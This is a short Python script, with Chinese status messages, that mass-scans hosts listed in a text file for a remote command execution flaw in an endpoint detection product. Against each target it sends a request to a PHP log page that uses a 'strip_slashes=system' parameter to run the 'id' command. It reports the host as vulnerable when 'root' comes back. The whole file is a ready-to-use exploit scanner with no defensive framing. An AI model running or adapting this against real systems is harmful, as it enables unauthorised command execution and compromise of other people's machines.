#!/usr/bin/python3
import requests
import sys

requests.packages.urllib3.disable_warnings()

def edr_rce(url):

    url3 = 'https://'+url.strip() + '/tool/log/c.php?strip_slashes=system&host=id'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36'
    }

    resp = requests.get(url=url3, headers=headers,verify=False)
    if 'root' in resp.text:
        print(url3 + ':'+ '存在EDR_RCE漏洞')
    else:
        print(url3 + ':'+ '不存在EDR_RCE漏洞')

if __name__ == '__main__':

    f = open("injection.txt")
    line = f.readline()
    for line in open("injection.txt"):
        url = line.strip()
        try:
            edr_rce(url)
        except:
            pass
    f.close()
    print('运行结束')


